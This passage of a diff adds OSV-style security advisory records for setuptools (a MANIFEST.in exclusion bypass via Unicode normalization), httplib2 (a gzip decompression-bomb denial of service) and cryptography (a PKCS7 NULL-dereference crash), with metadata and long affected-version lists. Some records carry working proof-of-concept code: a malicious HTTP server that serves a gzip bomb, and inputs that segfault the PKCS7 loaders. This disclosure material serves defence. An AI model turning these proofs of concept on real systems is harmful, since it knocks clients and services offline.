+    "summary": "setuptools: MANIFEST.in exclusion bypass in sdist via Unicode normalization collision (NFC/NFD) on macOS APFS/HFS+",
+    "details": "## Summary\n\nWhen building a source distribution (`python -m build --sdist` / `setup.py sdist`), setuptools' `FileList` applies `MANIFEST.in` directives (`exclude`, `global-exclude`, `recursive-exclude`, `prune`) by matching a compiled glob against on-disk file names **byte-for-byte, with no Unicode normalization**. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a `MANIFEST.in` rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the `.tar.gz` and, if published, uploaded to the public, immutable PyPI index.\n\n## Details\n\nFile names in `FileList.files` come from `os.walk` (`setuptools/_distutils/filelist.py`, `_find_all_simple`), so on APFS a file written NFD is offered to the matcher in NFD, while the `MANIFEST.in` pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:\n\n```python\n# setuptools/command/egg_info.py  (FileList.global_exclude)\ndef global_exclude(self, pattern):\n    match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -> regex, no NFC/NFD\n    return self._remove_files(match.match)                   # byte-level regex over raw os.walk names\n```\n\nA rule written NFC (`caf\u00e9` = `63 61 66 c3 a9`) does not match an on-disk name written NFD (`caf\u00e9` = `63 61 66 65 cc 81`), even though the filesystem treats the two as one file.\n\nA `unicodedata.normalize('NFD', ...)` helper exists in `setuptools/unicode_utils.py` (`decompose()`), but it is **never called in the manifest matching path**, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, `EggInfoCommand._manifest_normalize`, uses `filesys_decode` (bytes\u2192str decode only, no NFC/NFD) and runs when writing `SOURCES.txt`, after matching has already occurred.\n\n## Impact\n\n`MANIFEST.in` exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule \u2014 an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.\n\n## Proof of concept\n\nWith a project containing `MANIFEST.in`:\n\n```\nglobal-include *.txt *.json\nglobal-exclude secret_caf\u00e9.txt    # rule saved NFC\n```\n\nand an on-disk file `secret_caf\u00e9.txt` written in NFD, `python -m build --sdist` packs the secret file into the resulting `.tar.gz`, while an ASCII control file excluded by the same directive is correctly dropped \u2014 isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.\n\n## Remediation\n\nNormalize both the walked path and each `MANIFEST.in` pattern to a single canonical form before matching, in both `setuptools/command/egg_info.py` (`FileList`) and the vendored `setuptools/_distutils/filelist.py`. For an exclusion list, err toward excluding more, and document that `MANIFEST.in` matching is normalization-insensitive on macOS.\n\n## Credit\n\nReported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762.",
+    "aliases": [
+      "BIT-setuptools-2026-59890",
+      "CVE-2026-59890",
+      "PYSEC-2026-3447"
+    ],
+    "modified": "2026-09-10T03:50:52.323347787Z",
+    "published": "2026-07-21T19:09:21Z",
+    "database_specific": {
+      "github_reviewed_at": "2026-07-21T19:09:21Z",
+      "nvd_published_at": "2026-07-08T17:17:27Z",
+      "cwe_ids": [
+        "CWE-176",
+        "CWE-697"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/setuptools/security/advisories/GHSA-h35f-9h28-mq5c"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59890"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/setuptools/commit/dd9f436a36486b4cb8a4c70a2321548b0be09b8f"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/setuptools/PYSEC-2026-3447.yaml"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pypa/setuptools"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/setuptools/releases/tag/v83.0.0"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "setuptools",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/setuptools"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "83.0.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.6b1",
+          "0.6b2",
+          "0.6b3",
+          "0.6b4",
+          "0.6c1",
+          "0.6c10",
+          "0.6c11",
+          "0.6c2",
+          "0.6c3",
+          "0.6c4",
+          "0.6c5",
+          "0.6c6",
+          "0.6c7",
+          "0.6c8",
+          "0.6c9",
+          "0.7.2",
+          "0.7.3",
+          "0.7.4",
+          "0.7.5",
+          "0.7.6",
+          "0.7.7",
+          "0.7.8",
+          "0.8",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "0.9.4",
+          "0.9.5",
+          "0.9.6",
+          "0.9.7",
+          "0.9.8",
+          "1.0",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.1.3",
+          "1.1.4",
+          "1.1.5",
+          "1.1.6",
+          "1.1.7",
+          "1.2",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.4",
+          "1.4.1",
+          "1.4.2",
+          "10.0",
+          "10.0.1",
+          "10.1",
+          "10.2",
+          "10.2.1",
+          "11.0",
+          "11.1",
+          "11.2",
+          "11.3",
+          "11.3.1",
+          "12.0",
+          "12.0.1",
+          "12.0.2",
+          "12.0.3",
+          "12.0.4",
+          "12.0.5",
+          "12.1",
+          "12.2",
+          "12.3",
+          "12.4",
+          "13.0",
+          "13.0.1",
+          "13.0.2",
+          "14.0",
+          "14.1",
+          "14.1.1",
+          "14.2",
+          "14.3",
+          "14.3.1",
+          "15.0",
+          "15.1",
+          "15.2",
+          "16.0",
+          "17.0",
+          "17.1",
+          "17.1.1",
+          "18.0",
+          "18.0.1",
+          "18.1",
+          "18.2",
+          "18.3",
+          "18.3.1",
+          "18.3.2",
+          "18.4",
+          "18.5",
+          "18.6",
+          "18.6.1",
+          "18.7",
+          "18.7.1",
+          "18.8",
+          "18.8.1",
+          "19.0",
+          "19.1",
+          "19.1.1",
+          "19.2",
+          "19.3",
+          "19.4",
+          "19.4.1",
+          "19.5",
+          "19.6",
+          "19.6.1",
+          "19.6.2",
+          "19.7",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.2",
+          "20.0",
+          "20.1",
+          "20.1.1",
+          "20.10.1",
+          "20.2.2",
+          "20.3",
+          "20.3.1",
+          "20.4",
+          "20.6.6",
+          "20.6.7",
+          "20.6.8",
+          "20.7.0",
+          "20.8.0",
+          "20.8.1",
+          "20.9.0",
+          "21.0.0",
+          "21.1.0",
+          "21.2.0",
+          "21.2.1",
+          "21.2.2",
+          "22.0.0",
+          "22.0.1",
+          "22.0.2",
+          "22.0.4",
+          "22.0.5",
+          "23.0.0",
+          "23.1.0",
+          "23.2.0",
+          "23.2.1",
+          "24.0.0",
+          "24.0.1",
+          "24.0.2",
+          "24.0.3",
+          "24.1.0",
+          "24.1.1",
+          "24.2.0",
+          "24.2.1",
+          "24.3.0",
+          "24.3.1",
+          "25.0.0",
+          "25.0.1",
+          "25.0.2",
+          "25.1.0",
+          "25.1.1",
+          "25.1.2",
+          "25.1.3",
+          "25.1.4",
+          "25.1.5",
+          "25.1.6",
+          "25.2.0",
+          "25.3.0",
+          "25.4.0",
+          "26.0.0",
+          "26.1.0",
+          "26.1.1",
+          "27.0.0",
+          "27.1.0",
+          "27.1.2",
+          "27.2.0",
+          "27.3.0",
+          "27.3.1",
+          "28.0.0",
+          "28.1.0",
+          "28.2.0",
+          "28.3.0",
+          "28.4.0",
+          "28.5.0",
+          "28.6.0",
+          "28.6.1",
+          "28.7.0",
+          "28.7.1",
+          "28.8.0",
+          "28.8.1",
+          "29.0.0",
+          "29.0.1",
+          "3.0",
+          "3.0.1",
+          "3.0.2",
+          "3.1",
+          "3.2",
+          "3.3",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.5",
+          "3.5.1",
+          "3.5.2",
+          "3.6",
+          "3.7",
+          "3.7.1",
+          "3.8",
+          "3.8.1",
+          "30.0.0",
+          "30.1.0",
+          "30.2.0",
+          "30.2.1",
+          "30.3.0",
+          "30.4.0",
+          "31.0.0",
+          "31.0.1",
+          "32.0.0",
+          "32.1.0",
+          "32.1.1",
+          "32.1.2",
+          "32.1.3",
+          "32.2.0",
+          "32.3.0",
+          "32.3.1",
+          "33.1.0",
+          "33.1.1",
+          "34.0.0",
+          "34.0.1",
+          "34.0.2",
+          "34.0.3",
+          "34.1.0",
+          "34.1.1",
+          "34.2.0",
+          "34.3.0",
+          "34.3.1",
+          "34.3.2",
+          "34.3.3",
+          "34.4.0",
+          "34.4.1",
+          "35.0.0",
+          "35.0.1",
+          "35.0.2",
+          "36.0.1",
+          "36.1.0",
+          "36.1.1",
+          "36.2.0",
+          "36.2.1",
+          "36.2.2",
+          "36.2.3",
+          "36.2.4",
+          "36.2.5",
+          "36.2.6",
+          "36.2.7",
+          "36.3.0",
+          "36.4.0",
+          "36.5.0",
+          "36.6.0",
+          "36.6.1",
+          "36.7.0",
+          "36.7.1",
+          "36.7.2",
+          "36.8.0",
+          "37.0.0",
+          "38.0.0",
+          "38.1.0",
+          "38.2.0",
+          "38.2.1",
+          "38.2.3",
+          "38.2.4",
+          "38.2.5",
+          "38.3.0",
+          "38.4.0",
+          "38.4.1",
+          "38.5.0",
+          "38.5.1",
+          "38.5.2",
+          "38.6.0",
+          "38.6.1",
+          "38.7.0",
+          "39.0.0",
+          "39.0.1",
+          "39.1.0",
+          "39.2.0",
+          "4.0",
+          "4.0.1",
+          "40.0.0",
+          "40.1.0",
+          "40.1.1",
+          "40.2.0",
+          "40.3.0",
+          "40.4.0",
+          "40.4.1",
+          "40.4.2",
+          "40.4.3",
+          "40.5.0",
+          "40.6.0",
+          "40.6.1",
+          "40.6.2",
+          "40.6.3",
+          "40.7.0",
+          "40.7.1",
+          "40.7.2",
+          "40.7.3",
+          "40.8.0",
+          "40.9.0",
+          "41.0.0",
+          "41.0.1",
+          "41.1.0",
+          "41.2.0",
+          "41.3.0",
+          "41.4.0",
+          "41.5.0",
+          "41.5.1",
+          "41.6.0",
+          "42.0.0",
+          "42.0.1",
+          "42.0.2",
+          "43.0.0",
+          "44.0.0",
+          "44.1.0",
+          "44.1.1",
+          "45.0.0",
+          "45.1.0",
+          "45.2.0",
+          "45.3.0",
+          "46.0.0",
+          "46.1.0",
+          "46.1.1",
+          "46.1.2",
+          "46.1.3",
+          "46.2.0",
+          "46.3.0",
+          "46.3.1",
+          "46.4.0",
+          "47.0.0",
+          "47.1.0",
+          "47.1.1",
+          "47.2.0",
+          "47.3.0",
+          "47.3.1",
+          "47.3.2",
+          "48.0.0",
+          "49.0.0",
+          "49.0.1",
+          "49.1.0",
+          "49.1.1",
+          "49.1.2",
+          "49.1.3",
+          "49.2.0",
+          "49.2.1",
+          "49.3.0",
+          "49.3.1",
+          "49.3.2",
+          "49.4.0",
+          "49.5.0",
+          "49.6.0",
+          "5.0",
+          "5.0.1",
+          "5.0.2",
+          "5.1",
+          "5.2",
+          "5.3",
+          "5.4",
+          "5.4.1",
+          "5.4.2",
+          "5.5",
+          "5.5.1",
+          "5.6",
+          "5.7",
+          "5.8",
+          "50.0.0",
+          "50.0.1",
+          "50.0.2",
+          "50.0.3",
+          "50.1.0",
+          "50.2.0",
+          "50.3.0",
+          "50.3.1",
+          "50.3.2",
+          "51.0.0",
+          "51.1.0",
+          "51.1.0.post20201221",
+          "51.1.1",
+          "51.1.2",
+          "51.2.0",
+          "51.3.0",
+          "51.3.1",
+          "51.3.2",
+          "51.3.3",
+          "52.0.0",
+          "53.0.0",
+          "53.1.0",
+          "54.0.0",
+          "54.1.0",
+          "54.1.1",
+          "54.1.2",
+          "54.1.3",
+          "54.2.0",
+          "56.0.0",
+          "56.1.0",
+          "56.2.0",
+          "57.0.0",
+          "57.1.0",
+          "57.2.0",
+          "57.3.0",
+          "57.4.0",
+          "57.5.0",
+          "58.0.0",
+          "58.0.1",
+          "58.0.2",
+          "58.0.3",
+          "58.0.4",
+          "58.1.0",
+          "58.2.0",
+          "58.3.0",
+          "58.4.0",
+          "58.5.0",
+          "58.5.1",
+          "58.5.2",
+          "58.5.3",
+          "59.0.1",
+          "59.1.0",
+          "59.1.1",
+          "59.2.0",
+          "59.3.0",
+          "59.4.0",
+          "59.5.0",
+          "59.6.0",
+          "59.7.0",
+          "59.8.0",
+          "6.0.1",
+          "6.0.2",
+          "6.1",
+          "60.0.0",
+          "60.0.1",
+          "60.0.2",
+          "60.0.3",
+          "60.0.4",
+          "60.0.5",
+          "60.1.0",
+          "60.1.1",
+          "60.10.0",
+          "60.2.0",
+          "60.3.0",
+          "60.3.1",
+          "60.4.0",
+          "60.5.0",
+          "60.6.0",
+          "60.7.0",
+          "60.7.1",
+          "60.8.0",
+          "60.8.1",
+          "60.8.2",
+          "60.9.0",
+          "60.9.1",
+          "60.9.2",
+          "60.9.3",
+          "61.0.0",
+          "61.1.0",
+          "61.1.1",
+          "61.2.0",
+          "61.3.0",
+          "61.3.1",
+          "62.0.0",
+          "62.1.0",
+          "62.2.0",
+          "62.3.0",
+          "62.3.1",
+          "62.3.2",
+          "62.3.3",
+          "62.3.4",
+          "62.4.0",
+          "62.5.0",
+          "62.6.0",
+          "63.0.0",
+          "63.0.0b1",
+          "63.1.0",
+          "63.2.0",
+          "63.3.0",
+          "63.4.0",
+          "63.4.1",
+          "63.4.2",
+          "63.4.3",
+          "64.0.0",
+          "64.0.1",
+          "64.0.2",
+          "64.0.3",
+          "65.0.0",
+          "65.0.1",
+          "65.0.2",
+          "65.1.0",
+          "65.1.1",
+          "65.2.0",
+          "65.3.0",
+          "65.4.0",
+          "65.4.1",
+          "65.5.0",
+          "65.5.1",
+          "65.6.0",
+          "65.6.1",
+          "65.6.2",
+          "65.6.3",
+          "65.7.0",
+          "66.0.0",
+          "66.1.0",
+          "66.1.1",
+          "67.0.0",
+          "67.1.0",
+          "67.2.0",
+          "67.3.1",
+          "67.3.2",
+          "67.3.3",
+          "67.4.0",
+          "67.5.0",
+          "67.5.1",
+          "67.6.0",
+          "67.6.1",
+          "67.7.0",
+          "67.7.1",
+          "67.7.2",
+          "67.8.0",
+          "68.0.0",
+          "68.1.0",
+          "68.1.2",
+          "68.2.0",
+          "68.2.1",
+          "68.2.2",
+          "69.0.0",
+          "69.0.1",
+          "69.0.2",
+          "69.0.3",
+          "69.1.0",
+          "69.1.1",
+          "69.2.0",
+          "69.3.0",
+          "69.3.1",
+          "69.4.0",
+          "69.4.1",
+          "69.4.2",
+          "69.5.0",
+          "69.5.1",
+          "7.0",
+          "70.0.0",
+          "70.1.0",
+          "70.1.1",
+          "70.2.0",
+          "70.3.0",
+          "71.0.0",
+          "71.0.1",
+          "71.0.2",
+          "71.0.3",
+          "71.0.4",
+          "71.1.0",
+          "72.0.0",
+          "72.1.0",
+          "72.2.0",
+          "73.0.0",
+          "73.0.1",
+          "74.0.0",
+          "74.1.0",
+          "74.1.1",
+          "74.1.2",
+          "74.1.3",
+          "75.0.0",
+          "75.1.0",
+          "75.2.0",
+          "75.3.0",
+          "75.3.1",
+          "75.3.2",
+          "75.3.3",
+          "75.3.4",
+          "75.4.0",
+          "75.5.0",
+          "75.6.0",
+          "75.7.0",
+          "75.8.0",
+          "75.8.1",
+          "75.8.2",
+          "75.9.0",
+          "75.9.1",
+          "76.0.0",
+          "76.1.0",
+          "77.0.1",
+          "77.0.3",
+          "78.0.1",
+          "78.0.2",
+          "78.1.0",
+          "78.1.1",
+          "79.0.0",
+          "79.0.1",
+          "8.0",
+          "8.0.1",
+          "8.0.2",
+          "8.0.3",
+          "8.0.4",
+          "8.1",
+          "8.2",
+          "8.2.1",
+          "8.3",
+          "80.0.0",
+          "80.0.1",
+          "80.1.0",
+          "80.10.1",
+          "80.10.2",
+          "80.2.0",
+          "80.3.0",
+          "80.3.1",
+          "80.4.0",
+          "80.6.0",
+          "80.7.0",
+          "80.7.1",
+          "80.8.0",
+          "80.9.0",
+          "81.0.0",
+          "82.0.0",
+          "82.0.1",
+          "9.0",
+          "9.0.1",
+          "9.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-h35f-9h28-mq5c/GHSA-h35f-9h28-mq5c.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-j5g9-f88f-gfj3",
+    "summary": "httplib2: Decompression Bomb Denial of Service via Unbounded gzip/deflate Response Handling",
+    "details": "### Summary\n\nThe `httplib2` HTTP client library performs unbounded decompression of HTTP response bodies encoded with `Content-Encoding: gzip` or `deflate`. A malicious or compromised HTTP server can return a small compressed payload (approximately 150 KB) that expands to an arbitrarily large size in memory (150 MB or more), causing `MemoryError` or OOM-kill in the client process. This is a classic decompression bomb (zip bomb) attack against the HTTP client.\n\nAny application using `httplib2.Http().request()` against untrusted or attacker-controlled HTTP endpoints is affected.\n\n### Details\n\n**Affected code:** `httplib2/__init__.py` - `_decompressContent()` function\n\nThe decompression path has two unbounded operations:\n\n1. **gzip decompression** (line 394):\n   ```python\n   content = gzip.GzipFile(fileobj=io.BytesIO(new_content)).read()\n   ```\n   The `.read()` call with no size argument decompresses the entire gzip payload into a single in-memory bytes object. There is no limit on the decompressed size.\n\n2. **deflate decompression** (line 397):\n   ```python\n   content = zlib.decompress(content, zlib.MAX_WBITS)\n   ```\n   Similarly, `zlib.decompress()` returns the fully decompressed content as a single bytes object with no size bound.\n\n3. **Automatic invocation** (line 1431): `_decompressContent()` is called automatically on every HTTP response that includes a `Content-Encoding: gzip` or `deflate` header. The full compressed body is already buffered in memory via `response.read()` before decompression begins.\n\n**Root cause:** There is no `max_decompressed_size`, streaming decompression with size tracking, or decompression ratio check anywhere in the decompression path. The library unconditionally trusts the server's compressed payload size.\n\n**Attack vector:** Any HTTP server (including man-in-the-middle attackers or compromised upstream services) can trigger this by returning a response with:\n- `Content-Encoding: gzip` header\n- A small compressed body that decompresses to an arbitrarily large size\n\n### Proof of Concept\n\n**Step 1 - Start a malicious HTTP server that serves a gzip decompression bomb:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"Malicious HTTP server that serves a gzip decompression bomb.\"\"\"\nimport gzip\nimport http.server\nimport io\nimport socketserver\n\nUNCOMPRESSED_SIZE = 150 * 1024 * 1024  # 150 MB\n\ndef make_payload():\n    \"\"\"Create a gzip payload: ~150 KB compressed -> 150 MB decompressed.\"\"\"\n    buf = io.BytesIO()\n    with gzip.GzipFile(fileobj=buf, mode=\"wb\", compresslevel=9) as gz:\n        chunk = b\"A\" * (1024 * 1024)  # 1 MB of repeating bytes\n        for _ in range(UNCOMPRESSED_SIZE // len(chunk)):\n            gz.write(chunk)\n    return buf.getvalue()\n\nPAYLOAD = make_payload()\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/octet-stream\")\n        self.send_header(\"Content-Encoding\", \"gzip\")\n        self.send_header(\"Content-Length\", str(len(PAYLOAD)))\n        self.end_headers()\n        self.wfile.write(PAYLOAD)\n    def log_message(self, fmt, *args):\n        pass\n\nwith socketserver.TCPServer((\"127.0.0.1\", 8000), Handler) as httpd:\n    print(f\"Bomb server ready: {len(PAYLOAD)} bytes compressed -> \"\n          f\"{UNCOMPRESSED_SIZE} bytes decompressed\")\n    httpd.serve_forever()\n```\n\n**Step 2 - Run the httplib2 client (in a separate terminal):**\n\n```python\n#!/usr/bin/env python3\n\"\"\"Client that demonstrates MemoryError from httplib2 decompression bomb.\"\"\"\nimport resource\nimport httplib2\n\n# Set a 180 MB memory limit to make the crash deterministic\nLIMIT_MB = 180\nlimit = LIMIT_MB * 1024 * 1024\nresource.setrlimit(resource.RLIMIT_AS, (limit, limit))\n\nhttp = httplib2.Http(timeout=5)\ntry:\n    response, content = http.request(\"http://127.0.0.1:8000/\")\n    print(f\"Unexpected success: received {len(content)} bytes\")\nexcept MemoryError:\n    print(f\"MemoryError confirmed: decompression bomb exhausted \"\n          f\"{LIMIT_MB} MB memory limit\")\n    # This is the expected outcome - the 150 KB compressed payload\n    # expanded to 150 MB during decompression, exceeding the limit.\n```\n\n**Expected output (client):**\n```\nMemoryError confirmed: decompression bomb exhausted 180 MB memory limit\n```\n\n**Reproduction metrics:**\n- Compressed payload size: **152,908 bytes** (~150 KB)\n- Decompressed size: **157,286,400 bytes** (150 MB)\n- Amplification ratio: **~1,029x**\n- Client memory limit: 180 MB -> `MemoryError` triggered during `gzip.GzipFile.read()`\n\n### Impact\n\n**Severity: High**\n\nAny application using `httplib2` to make HTTP requests to untrusted servers is vulnerable. The attack requires no authentication, no special configuration, and no user interaction - the server simply returns a crafted gzip-compressed response.\n\n| Parameter | Value |\n|---|---|\n| Compressed payload | ~150 KB |\n| Decompressed size | 150 MB (configurable by attacker) |\n| Amplification ratio | ~1,029x |\n| Authentication required | None |\n| User interaction required | None |\n| Prerequisites | Client makes any HTTP request to attacker-controlled server |\n\n**Real-world scenarios:**\n- **Web scrapers/crawlers** that fetch pages from untrusted URLs\n- **API clients** connecting to third-party services\n- **Webhook handlers** that follow redirects to attacker-controlled endpoints\n- **CI/CD pipelines** that download dependencies or artifacts over HTTP\n- **Any MITM attacker** on an unencrypted HTTP connection can inject the compressed payload\n\n**Impact scaling:** The attacker can create arbitrarily large decompression bombs. A 1 MB compressed payload can decompress to several gigabytes, guaranteeing OOM-kill on virtually any system. The attack is fully deterministic and requires only a single HTTP response.\n\n**Downstream exposure:** `httplib2` is a widely used Python HTTP client library with millions of downloads. It is a dependency of Google's API client libraries (`google-api-python-client`, `google-auth-httplib2`), meaning applications using Google Cloud APIs may be indirectly affected if they process responses from untrusted intermediaries.\n\n---\n### Credit\n\nFound by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities.\nLiyi Zhou: https://lzhou1110.github.io/\nZiyue Wang: https://zyy0530.github.io/\nStrick: https://str1ckl4nd.github.io/\nMaurice: https://maurice.busystar.org/\nChenchen Yu: https://7thparkk.github.io/",
+    "aliases": [
+      "CVE-2026-59939",
+      "PYSEC-2026-3444"
+    ],
+    "modified": "2026-09-10T03:50:12.369455663Z",
+    "published": "2026-07-24T15:15:05Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-400",
+        "CWE-409",
+        "CWE-770"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-07-24T15:15:05Z",
+      "nvd_published_at": "2026-07-08T20:16:59Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/httplib2/httplib2/security/advisories/GHSA-j5g9-f88f-gfj3"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59939"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/httplib2/httplib2/commit/87581ad6cf752fe3da2090c59058261d2d00a427"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/httplib2/httplib2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/httplib2/httplib2/releases/tag/v0.32.0"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/httplib2/PYSEC-2026-3444.yaml"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2026/08/msg00039.html"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "httplib2",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/httplib2"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "0.32.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.10.3",
+          "0.11.0",
+          "0.11.1",
+          "0.11.3",
+          "0.12.0",
+          "0.12.1",
+          "0.12.3",
+          "0.13.0",
+          "0.13.1",
+          "0.14.0",
+          "0.15.0",
+          "0.16.0",
+          "0.17.0",
+          "0.17.1",
+          "0.17.2",
+          "0.17.3",
+          "0.17.4",
+          "0.18.0",
+          "0.18.1",
+          "0.19.0",
+          "0.19.1",
+          "0.20.0",
+          "0.20.1",
+          "0.20.2",
+          "0.20.4",
+          "0.21.0",
+          "0.22.0",
+          "0.30.0",
+          "0.30.2",
+          "0.31.0",
+          "0.31.1",
+          "0.31.2",
+          "0.7.0",
+          "0.7.1",
+          "0.7.2",
+          "0.7.3",
+          "0.7.4",
+          "0.7.5",
+          "0.7.6",
+          "0.7.7",
+          "0.8",
+          "0.9",
+          "0.9.1",
+          "0.9.2"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-j5g9-f88f-gfj3/GHSA-j5g9-f88f-gfj3.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-jfhm-5ghh-2f97",
+    "summary": "cryptography vulnerable to NULL-dereference when loading PKCS7 certificates",
+    "details": "### Summary\n\nCalling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.\n\n### PoC\nHere is a Python code that triggers the issue:\n```python\nfrom cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates\n\npem_p7 = b\"\"\"\n-----BEGIN PKCS7-----\nMAsGCSqGSIb3DQEHAg==\n-----END PKCS7-----\n\"\"\"\n\nder_p7 = b\"\\x30\\x0B\\x06\\x09\\x2A\\x86\\x48\\x86\\xF7\\x0D\\x01\\x07\\x02\"\n\nload_pem_pkcs7_certificates(pem_p7)\nload_der_pkcs7_certificates(der_p7)\n```\n\n### Impact\nExploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.",
+    "aliases": [
+      "CVE-2023-49083",
+      "PYSEC-2023-254"
+    ],
+    "modified": "2026-09-10T03:49:59.095260608Z",
+    "published": "2023-11-28T20:46:46Z",
+    "database_specific": {
+      "nvd_published_at": "2023-11-29T19:15:07Z",
+      "cwe_ids": [
+        "CWE-476"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-11-28T20:46:46Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49083"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/pull/9926"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-254.yaml"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2024/10/msg00012.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QMNTYMUGFJSDBYBU22FUYBHFRZODRKXV"
+      },
+      {
+        "type": "WEB",
+        "url": "http://www.openwall.com/lists/oss-security/2023/11/29/2"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "3.1"
+              },
+              {
+                "fixed": "41.0.6"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3",
+          "41.0.4",
+          "41.0.5"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-jfhm-5ghh-2f97/GHSA-jfhm-5ghh-2f97.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
